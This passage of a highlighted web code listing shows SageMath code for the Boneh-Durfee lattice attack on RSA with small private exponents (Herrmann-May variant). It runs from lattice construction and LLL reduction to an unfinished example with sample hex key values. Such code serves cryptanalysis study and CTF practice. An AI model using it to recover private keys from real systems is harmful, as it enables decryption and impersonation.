class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="108"></td><td><pre>                    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_rows<span class="token punctuation">(</span><span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="109"></td><td><pre>                    monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>affected_vector_index<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="110"></td><td><pre>                    monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>ii<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="111"></td><td><pre>                    BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> ii<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="112"></td><td><pre>                    <span class="token keyword">return</span> BB</pre></td></tr><tr><td data-num="113"></td><td><pre>    <span class="token comment"># nothing happened</span></pre></td></tr><tr><td data-num="114"></td><td><pre>    <span class="token keyword">return</span> BB</pre></td></tr><tr><td data-num="115"></td><td><pre></pre></td></tr><tr><td data-num="116"></td><td><pre><span class="token triple-quoted-string string">""" </pre></td></tr><tr><td data-num="117"></td><td><pre>Returns:</pre></td></tr><tr><td data-num="118"></td><td><pre>* 0,0   if it fails</pre></td></tr><tr><td data-num="119"></td><td><pre>* -1,-1 if `strict=true`, and determinant doesn't bound</pre></td></tr><tr><td data-num="120"></td><td><pre>* x0,y0 the solutions of `pol`</pre></td></tr><tr><td data-num="121"></td><td><pre>"""</span></pre></td></tr><tr><td data-num="122"></td><td><pre><span class="token keyword">def</span> <span class="token function">boneh_durfee</span><span class="token punctuation">(</span>pol<span class="token punctuation">,</span> modulus<span class="token punctuation">,</span> mm<span class="token punctuation">,</span> tt<span class="token punctuation">,</span> XX<span class="token punctuation">,</span> YY<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="123"></td><td><pre>    <span class="token triple-quoted-string string">"""</pre></td></tr><tr><td data-num="124"></td><td><pre>    Boneh and Durfee revisited by Herrmann and May</pre></td></tr><tr><td data-num="125"></td><td><pre>    </pre></td></tr><tr><td data-num="126"></td><td><pre>    finds a solution if:</pre></td></tr><tr><td data-num="127"></td><td><pre>    * d &lt; N^delta</pre></td></tr><tr><td data-num="128"></td><td><pre>    * |x| &lt; e^delta</pre></td></tr><tr><td data-num="129"></td><td><pre>    * |y| &lt; e^0.5</pre></td></tr><tr><td data-num="130"></td><td><pre>    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</pre></td></tr><tr><td data-num="131"></td><td><pre>    """</span></pre></td></tr><tr><td data-num="132"></td><td><pre></pre></td></tr><tr><td data-num="133"></td><td><pre>    <span class="token comment"># substitution (Herrman and May)</span></pre></td></tr><tr><td data-num="134"></td><td><pre>    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="135"></td><td><pre>    Q <span class="token operator">=</span> PR<span class="token punctuation">.</span>quotient<span class="token punctuation">(</span>x<span class="token operator">*</span>y <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">-</span> u<span class="token punctuation">)</span> <span class="token comment"># u = xy + 1</span></pre></td></tr><tr><td data-num="136"></td><td><pre>    polZ <span class="token operator">=</span> Q<span class="token punctuation">(</span>pol<span class="token punctuation">)</span><span class="token punctuation">.</span>lift<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="137"></td><td><pre></pre></td></tr><tr><td data-num="138"></td><td><pre>    UU <span class="token operator">=</span> XX<span class="token operator">*</span>YY <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="139"></td><td><pre></pre></td></tr><tr><td data-num="140"></td><td><pre>    <span class="token comment"># x-shifts</span></pre></td></tr><tr><td data-num="141"></td><td><pre>    gg <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="142"></td><td><pre>    <span class="token keyword">for</span> kk <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="143"></td><td><pre>        <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>mm <span class="token operator">-</span> kk <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="144"></td><td><pre>            xshift <span class="token operator">=</span> x<span class="token operator">^</span>ii <span class="token operator">*</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm <span class="token operator">-</span> kk<span class="token punctuation">)</span> <span class="token operator">*</span> polZ<span class="token punctuation">(</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token operator">^</span>kk</pre></td></tr><tr><td data-num="145"></td><td><pre>            gg<span class="token punctuation">.</span>append<span class="token punctuation">(</span>xshift<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="146"></td><td><pre>    gg<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="147"></td><td><pre></pre></td></tr><tr><td data-num="148"></td><td><pre>    <span class="token comment"># x-shifts list of monomials</span></pre></td></tr><tr><td data-num="149"></td><td><pre>    monomials <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="150"></td><td><pre>    <span class="token keyword">for</span> polynomial <span class="token keyword">in</span> gg<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="151"></td><td><pre>        <span class="token keyword">for</span> monomial <span class="token keyword">in</span> polynomial<span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="152"></td><td><pre>            <span class="token keyword">if</span> monomial <span class="token keyword">not</span> <span class="token keyword">in</span> monomials<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="153"></td><td><pre>                monomials<span class="token punctuation">.</span>append<span class="token punctuation">(</span>monomial<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="154"></td><td><pre>    monomials<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="155"></td><td><pre>    </pre></td></tr><tr><td data-num="156"></td><td><pre>    <span class="token comment"># y-shifts (selected by Herrman and May)</span></pre></td></tr><tr><td data-num="157"></td><td><pre>    <span class="token keyword">for</span> jj <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> tt <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="158"></td><td><pre>        <span class="token keyword">for</span> kk <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>floor<span class="token punctuation">(</span>mm<span class="token operator">/</span>tt<span class="token punctuation">)</span> <span class="token operator">*</span> jj<span class="token punctuation">,</span> mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="159"></td><td><pre>            yshift <span class="token operator">=</span> y<span class="token operator">^</span>jj <span class="token operator">*</span> polZ<span class="token punctuation">(</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token operator">^</span>kk <span class="token operator">*</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm <span class="token operator">-</span> kk<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="160"></td><td><pre>            yshift <span class="token operator">=</span> Q<span class="token punctuation">(</span>yshift<span class="token punctuation">)</span><span class="token punctuation">.</span>lift<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="161"></td><td><pre>            gg<span class="token punctuation">.</span>append<span class="token punctuation">(</span>yshift<span class="token punctuation">)</span> <span class="token comment"># substitution</span></pre></td></tr><tr><td data-num="162"></td><td><pre>    </pre></td></tr><tr><td data-num="163"></td><td><pre>    <span class="token comment"># y-shifts list of monomials</span></pre></td></tr><tr><td data-num="164"></td><td><pre>    <span class="token keyword">for</span> jj <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> tt <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="165"></td><td><pre>        <span class="token keyword">for</span> kk <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>floor<span class="token punctuation">(</span>mm<span class="token operator">/</span>tt<span class="token punctuation">)</span> <span class="token operator">*</span> jj<span class="token punctuation">,</span> mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="166"></td><td><pre>            monomials<span class="token punctuation">.</span>append<span class="token punctuation">(</span>u<span class="token operator">^</span>kk <span class="token operator">*</span> y<span class="token operator">^</span>jj<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="167"></td><td><pre></pre></td></tr><tr><td data-num="168"></td><td><pre>    <span class="token comment"># construct lattice B</span></pre></td></tr><tr><td data-num="169"></td><td><pre>    nn <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>monomials<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="170"></td><td><pre>    BB <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> nn<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="171"></td><td><pre>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="172"></td><td><pre>        BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="173"></td><td><pre>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> ii <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="174"></td><td><pre>            <span class="token keyword">if</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span> <span class="token keyword">in</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="175"></td><td><pre>                BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">=</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">.</span>monomial_coefficient<span class="token punctuation">(</span>monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="176"></td><td><pre></pre></td></tr><tr><td data-num="177"></td><td><pre>    <span class="token comment"># Prototype to reduce the lattice</span></pre></td></tr><tr><td data-num="178"></td><td><pre>    <span class="token keyword">if</span> helpful_only<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="179"></td><td><pre>        <span class="token comment"># automatically remove</span></pre></td></tr><tr><td data-num="180"></td><td><pre>        BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">,</span> nn<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="181"></td><td><pre>        <span class="token comment"># reset dimension</span></pre></td></tr><tr><td data-num="182"></td><td><pre>        nn <span class="token operator">=</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="183"></td><td><pre>        <span class="token keyword">if</span> nn <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="184"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"failure"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="185"></td><td><pre>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="186"></td><td><pre></pre></td></tr><tr><td data-num="187"></td><td><pre>    <span class="token comment"># check if vectors are helpful</span></pre></td></tr><tr><td data-num="188"></td><td><pre>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="189"></td><td><pre>        helpful_vectors<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="190"></td><td><pre>    </pre></td></tr><tr><td data-num="191"></td><td><pre>    <span class="token comment"># check if determinant is correctly bounded</span></pre></td></tr><tr><td data-num="192"></td><td><pre>    det <span class="token operator">=</span> BB<span class="token punctuation">.</span>det<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="193"></td><td><pre>    bound <span class="token operator">=</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm<span class="token operator">*</span>nn<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="194"></td><td><pre>    <span class="token keyword">if</span> det <span class="token operator">>=</span> bound<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="195"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"We do not have det &lt; bound. Solutions might not be found."</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="196"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Try with highers m and t."</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="197"></td><td><pre>        <span class="token keyword">if</span> debug<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="198"></td><td><pre>            diff <span class="token operator">=</span> <span class="token punctuation">(</span>log<span class="token punctuation">(</span>det<span class="token punctuation">)</span> <span class="token operator">-</span> log<span class="token punctuation">(</span>bound<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="199"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"size det(L) - size e^(m*n) = "</span><span class="token punctuation">,</span> floor<span class="token punctuation">(</span>diff<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="200"></td><td><pre>        <span class="token keyword">if</span> strict<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="201"></td><td><pre>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span></pre></td></tr><tr><td data-num="202"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="203"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="204"></td><td><pre></pre></td></tr><tr><td data-num="205"></td><td><pre>    <span class="token comment"># display the lattice basis</span></pre></td></tr><tr><td data-num="206"></td><td><pre>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="207"></td><td><pre>        matrix_overview<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="208"></td><td><pre></pre></td></tr><tr><td data-num="209"></td><td><pre>    <span class="token comment"># LLL</span></pre></td></tr><tr><td data-num="210"></td><td><pre>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="211"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"optimizing basis of the lattice via LLL, this can take a long time"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="212"></td><td><pre></pre></td></tr><tr><td data-num="213"></td><td><pre>    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="214"></td><td><pre></pre></td></tr><tr><td data-num="215"></td><td><pre>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="216"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"LLL is done!"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="217"></td><td><pre></pre></td></tr><tr><td data-num="218"></td><td><pre>    <span class="token comment"># transform vector i &amp; j -> polynomials 1 &amp; 2</span></pre></td></tr><tr><td data-num="219"></td><td><pre>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="220"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"looking for independent vectors in the lattice"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="221"></td><td><pre>    found_polynomials <span class="token operator">=</span> <span class="token boolean">False</span></pre></td></tr><tr><td data-num="222"></td><td><pre>    </pre></td></tr><tr><td data-num="223"></td><td><pre>    <span class="token keyword">for</span> pol1_idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>nn <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="224"></td><td><pre>        <span class="token keyword">for</span> pol2_idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>pol1_idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> nn<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="225"></td><td><pre>            <span class="token comment"># for i and j, create the two polynomials</span></pre></td></tr><tr><td data-num="226"></td><td><pre>            PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>w<span class="token punctuation">,</span>z<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="227"></td><td><pre>            pol1 <span class="token operator">=</span> pol2 <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="228"></td><td><pre>            <span class="token keyword">for</span> jj <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="229"></td><td><pre>                pol1 <span class="token operator">+=</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>w<span class="token operator">*</span>z<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>w<span class="token punctuation">,</span>z<span class="token punctuation">)</span> <span class="token operator">*</span> BB<span class="token punctuation">[</span>pol1_idx<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">/</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="230"></td><td><pre>                pol2 <span class="token operator">+=</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>w<span class="token operator">*</span>z<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>w<span class="token punctuation">,</span>z<span class="token punctuation">)</span> <span class="token operator">*</span> BB<span class="token punctuation">[</span>pol2_idx<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">/</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="231"></td><td><pre></pre></td></tr><tr><td data-num="232"></td><td><pre>            <span class="token comment"># resultant</span></pre></td></tr><tr><td data-num="233"></td><td><pre>            PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>q<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="234"></td><td><pre>            rr <span class="token operator">=</span> pol1<span class="token punctuation">.</span>resultant<span class="token punctuation">(</span>pol2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="235"></td><td><pre></pre></td></tr><tr><td data-num="236"></td><td><pre>            <span class="token comment"># are these good polynomials?</span></pre></td></tr><tr><td data-num="237"></td><td><pre>            <span class="token keyword">if</span> rr<span class="token punctuation">.</span>is_zero<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> rr<span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="238"></td><td><pre>                <span class="token keyword">continue</span></pre></td></tr><tr><td data-num="239"></td><td><pre>            <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="240"></td><td><pre>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"found them, using vectors"</span><span class="token punctuation">,</span> pol1_idx<span class="token punctuation">,</span> <span class="token string">"and"</span><span class="token punctuation">,</span> pol2_idx<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="241"></td><td><pre>                found_polynomials <span class="token operator">=</span> <span class="token boolean">True</span></pre></td></tr><tr><td data-num="242"></td><td><pre>                <span class="token keyword">break</span></pre></td></tr><tr><td data-num="243"></td><td><pre>        <span class="token keyword">if</span> found_polynomials<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="244"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr><tr><td data-num="245"></td><td><pre></pre></td></tr><tr><td data-num="246"></td><td><pre>    <span class="token keyword">if</span> <span class="token keyword">not</span> found_polynomials<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="247"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"no independant vectors could be found. This should very rarely happen..."</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="248"></td><td><pre>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="249"></td><td><pre>    </pre></td></tr><tr><td data-num="250"></td><td><pre>    rr <span class="token operator">=</span> rr<span class="token punctuation">(</span>q<span class="token punctuation">,</span> q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="251"></td><td><pre></pre></td></tr><tr><td data-num="252"></td><td><pre>    <span class="token comment"># solutions</span></pre></td></tr><tr><td data-num="253"></td><td><pre>    soly <span class="token operator">=</span> rr<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="254"></td><td><pre></pre></td></tr><tr><td data-num="255"></td><td><pre>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>soly<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="256"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Your prediction (delta) is too small"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="257"></td><td><pre>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="258"></td><td><pre></pre></td></tr><tr><td data-num="259"></td><td><pre>    soly <span class="token operator">=</span> soly<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="260"></td><td><pre>    ss <span class="token operator">=</span> pol1<span class="token punctuation">(</span>q<span class="token punctuation">,</span> soly<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="261"></td><td><pre>    solx <span class="token operator">=</span> ss<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="262"></td><td><pre></pre></td></tr><tr><td data-num="263"></td><td><pre>    <span class="token comment">#</span></pre></td></tr><tr><td data-num="264"></td><td><pre>    <span class="token keyword">return</span> solx<span class="token punctuation">,</span> soly</pre></td></tr><tr><td data-num="265"></td><td><pre></pre></td></tr><tr><td data-num="266"></td><td><pre><span class="token keyword">def</span> <span class="token function">example</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="267"></td><td><pre>    <span class="token comment">############################################</span></pre></td></tr><tr><td data-num="268"></td><td><pre>    <span class="token comment"># How To Use This Script</span></pre></td></tr><tr><td data-num="269"></td><td><pre>    <span class="token comment">##########################################</span></pre></td></tr><tr><td data-num="270"></td><td><pre></pre></td></tr><tr><td data-num="271"></td><td><pre>    <span class="token comment">#</span></pre></td></tr><tr><td data-num="272"></td><td><pre>    <span class="token comment"># The problem to solve (edit the following values)</span></pre></td></tr><tr><td data-num="273"></td><td><pre>    <span class="token comment">#</span></pre></td></tr><tr><td data-num="274"></td><td><pre></pre></td></tr><tr><td data-num="275"></td><td><pre>    <span class="token comment"># the modulus</span></pre></td></tr><tr><td data-num="276"></td><td><pre>    N <span class="token operator">=</span> <span class="token number">0x665166804cd78e8197073f65f58bca14e019982245fcc7cad74535e948a4e0258b2e919bf3720968a00e5240c5e1d6b8831d8fec300d969fccec6cce11dde826d3fbe0837194f2dc64194c78379440671563c6c75267f0286d779e6d91d3e9037c642a860a894d8c45b7ed564d341501cedf260d3019234f2964ccc6c56b6de8a4f66667e9672a03f6c29d95100cdf5cb363d66f2131823a953621680300ab3a2eb51c12999b6d4249dde499055584925399f3a8c7a4a5a21f095878e80bbc772f785d2cbf70a87c6b854eb566e1e1beb7d4ac6eb46023b3dc7fdf34529a40f5fc5797f9c15c54ed4cb018c072168e9c30ca3602e00ea4047d2e5686c6eb37b9</span></pre></td></tr><tr><td data-num="277"></td><td><pre>    <span class="token comment"># the public exponent</span></pre></td></tr><tr><td data-num="278"></td><td><pre>    e <span class="token operator">=</span> <span class="token number">0x2c998e57bc651fe4807443dbb3e794711ca22b473d7792a64b7a326538dc528a17c79c72e425bf29937e47b2d6f6330ee5c13bfd8564b50e49132d47befd0ee2e85f4bfe2c9452d62ef838d487c099b3d7c80f14e362b3d97ca4774f1e4e851d38a4a834b077ded3d40cd20ddc45d57581beaa7b4d299da9dec8a1f361c808637238fa368e07c7d08f5654c7b2f8a90d47857e9b9c0a81a46769f6307d5a4442707afb017959d9a681fa1dc8d97565e55f02df34b04a3d0a0bf98b7798d7084db4b3f6696fa139f83ada3dc70d0b4c57bf49f530dec938096071f9c4498fdef9641dfbfe516c985b27d1748cc6ce1a4beb1381fb165a3d14f61032e0f76f095d</span></pre></td></tr><tr><td data-num="279"></td><td><pre></pre></td></tr><tr><td data-num="280"></td><td><pre>    <span class="token comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></pre></td></tr><tr><td data-num="281"></td><td><pre>    delta <span class="token operator">=</span> <span class="token number">.18</span> <span class="token comment"># this means that d &lt; N^delta</span></pre></td></tr><tr><td data-num="282"></td><td><pre></pre></td></tr><tr><td data-num="283"></td><td><pre>    <span class="token comment">#</span></pre></td></tr><tr><td data-num="284"></td><td><pre>    <span class="token comment"># Lattice (tweak those values)</span></pre></td></tr><tr><td data-num="285"></td><td><pre>    <span class="token comment">#</span></pre></td></tr><tr><td data-num="286"></td><td><pre></pre></td></tr><tr><td data-num="287"></td><td><pre>    <span class="token comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></pre></td></tr><tr><td data-num="288"></td><td><pre>    m <span class="token operator">=</span> <span class="token number">4</span> <span class="token comment"># size of the lattice (bigger the better/slower)</span></pre></td></tr><tr><td data-num="289"></td><td><pre></pre></td></tr><tr><td data-num="290"></td><td><pre>    <span class="token comment"># you need to be a lattice master to tweak these</span></pre></td></tr><tr><td data-num="291"></td><td><pre>    t <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">*</span>delta<span class="token punctuation">)</span> <span class="token operator">*</span> m<span class="token punctuation">)</span>  <span class="token comment"># optimization from Herrmann and May</span></pre></td></tr><tr><td data-num="292"></td><td><pre>    